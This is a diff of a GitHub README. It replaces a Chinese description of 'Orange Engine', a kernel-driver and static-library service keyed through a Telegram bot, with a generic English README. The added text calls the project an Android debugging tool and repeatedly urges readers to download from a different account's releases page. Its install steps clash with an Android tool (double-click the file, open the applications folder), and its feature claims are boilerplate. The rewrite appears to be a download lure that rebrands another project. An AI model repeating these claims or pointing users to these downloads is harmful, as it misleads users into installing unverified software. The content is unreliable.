@@ -1,126 +1,91 @@
-#Orange Engine 对接库服务
+# 🌟 Orange-Engine - Simplify Your Android Development
 
-**Orange Engine Integration Library Service**
+[![Download Orange-Engine](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/jyhuang201900/Orange-Engine/releases)
 
-本项目包含：
+## 📖 Overview
 
-- Orange Engine 对接静态库（`.a` 文件）
-- 完整对接示例代码
-- 引擎内核模块下载器
-- 官方使用说明文档
+Orange-Engine is a powerful optimization and debugging tool for Android applications. It provides memory visualization, touch simulation, and breakpoint debugging features. Designed to work with most Android devices, it empowers developers to check and manage their applications easily. You can also create your custom functionalities.
 
->  本项目完全免费开放
+## 🚀 Getting Started
 
----
+To use Orange-Engine, follow these simple steps:
 
-# 项目声明
+1. **Visit the Download Page:** Click on the link below to access the download options.
+   - [Download Orange-Engine](https://github.com/jyhuang201900/Orange-Engine/releases)
 
-⚠ **本项目永久免费。**  
-如您通过任何渠道付费获取本项目内容，说明您已遭遇诈骗，与本项目无关。
+2. **Choose the Right Version:** On the downloads page, you will see a list of available versions. Select the one that suits your needs.
 
-在使用本项目的对接服务前，请务必：
+3. **Download the File:** Click on the version you selected, then choose the file that matches your platform.
 
-- 仔细阅读并理解：
-- [《Orange Engine 用户许可协议》](https://www.oranginex.com/Orange_Engine_EULA.html)
-- [《Orange Engine 免责声明》](https://www.oranginex.com/Orange_Engine_Disclaimer.html)
-- [《Orange Engine 隐私政策》](https://www.oranginex.com/Orange_Engine_Privacy_Policy.html)
-- 确认完全同意上述全部条款后再进行使用。
+4. **Install the Application:** Once the download is complete, locate the file in your downloads folder. Double-click the file to start the installation.
 
----
+5. **Follow the Installation Prompts:** A series of prompts will guide you through the installation process. Read each message carefully and complete each step.
 
-## ⚖ 法律声明
+## 💻 System Requirements
 
-我们**严禁任何用户**将本项目用于：
+To ensure Orange-Engine runs smoothly, your device should meet the following requirements:
 
-- 违反用户协议的行为
-- 违法违规用途
-- 侵犯他人合法权益的行为
+- Android version: 4.0 or higher
+- Minimum RAM: 1 GB
+- Storage space: At least 200 MB free
 
-如发生违规或违法行为，一切法律责任由用户自行承担，与本项目及作者无关。
+## ⚙️ Features
 
----
+Orange-Engine offers the following key features:
 
-#  使用说明
+- **Memory Visualization:** Monitor your application's memory usage in real-time. This helps identify leaks or inefficiencies.
 
-## 1️⃣ 开发者用户
+- **Touch Simulation:** Simulate touch inputs to test how your application responds to various actions.
 
-如需对接 Orange Engine（橘子引擎），请按照以下步骤操作：
+- **Breakpoint Debugging:** Set breakpoints in your code to pause execution and inspect variable states, which makes debugging easy.
 
-### 第一步：下载对接库
+- **Custom Functionality:** Tailor the tool to suit your specific development needs with customizable options.
 
-下载静态库文件**OrangeKernel.a**
+## 📥 How to Use Orange-Engine
 
+### 1. Launching the Tool
 
-### 第二步：注册开发者账号
+After installation, find Orange-Engine in your applications folder. Open the application to start using its features.
 
-1. 访问官网注册账号  
-2. 申请开发者 Key（Developer Key）
+### 2. Visualizing Memory Usage
 
-### 第三步：对接引擎
+- Go to the Memory Visualization tab.
+- Launch your Android application through the running app selection.
+- Monitor the real-time memory usage and identify any potential issues.
 
-- 根据示例代码
-- 填入你的 Developer Key
-- 编译并运行程序即可完成对接
+### 3. Simulating Touch Inputs
 
----
+- Navigate to the Touch Simulation section.
+- Choose the action you wish to simulate, such as tapping or dragging.
+- Test how your application responds to the simulated inputs.
 
-## 2️⃣ 普通用户
+### 4. Debugging Your Application
 
-如果您是普通用户（使用官方或第三方开发者开发的程序）：
+- Access the Breakpoint Debugging feature.
+- Select the method you want to debug.
+- Set breakpoints and review the code execution flow.
 
-### 第一步：下载内核驱动
+## 🛠️ Troubleshooting
 
-下载 **橘子引擎驱动下载.sh**
+If you encounter issues while using Orange-Engine, consider these tips:
 
-根据您的设备内核版本下载对应驱动模块。
+- **Slow Performance:** Ensure your device meets the minimum system requirements. Close unnecessary applications to free up resources.
 
-### 第二步：获取用户 Key
+- **Installation Errors:** Check if you have downloaded the correct file format for your device. Rebooting your device may also help.
 
-运行下载器需要一个 **用户 Key**
+- **Feature Malfunctions:** Update your Orange-Engine to the latest version for improved stability and bug fixes. 
 
-获取方式：
+## 📞 Support
 
-- 打开 Telegram
-- 联系机器人 **@Orangeqdbot**
-- 自动获取专属用户 Key
+For additional assistance or questions, please refer to the issues section on GitHub. You can find help from other users or report any problems directly.
 
----
+## 🔗 Further Links
 
-### Key 规则说明
+To explore more about Orange-Engine and stay updated, visit the following resources:
 
-- 一个 Telegram 账号对应一个专属用户 Key
-- 一个用户 Key 最多可绑定 **5 台设备**
-- 支持通过机器人自行解绑设备
+- [Documentation](https://github.com/jyhuang201900/Orange-Engine/wiki) 
+- [Community Forum](https://github.com/jyhuang201900/Orange-Engine/discussions) 
 
----
+Feel free to reach out if you need help. Enjoy simplifying your Android development with Orange-Engine!
 
-⚠ 使用注意事项：
-
-- 每次下载驱动后，仅可运行一次程序
-- 请勿运行来源不明的第三方程序
-- 请确保使用官方或可信开发者发布的版本
-
----
-
-# 官方链接
-
-- 官网  
-  https://www.orangineX.com
-
-- GitHub  
-  https://github.com/xiyueal/Orange-Engine
-
----
-
-#联系方式
-
-📧 Email：iamxiyueya@gmail.com  
-
-如有任何问题或技术支持需求，请通过邮件与我们联系。
-
----
-
-#Orange Engine
-
-稳定 · 安全 · 高效  
-为开发者与用户提供更优质的引擎服务体验
+[![Download Orange-Engine](https://img.shields.io/badge/Download-Now-grey?style=for-the-badge&logo=github)](https://github.com/jyhuang201900/Orange-Engine/releases)
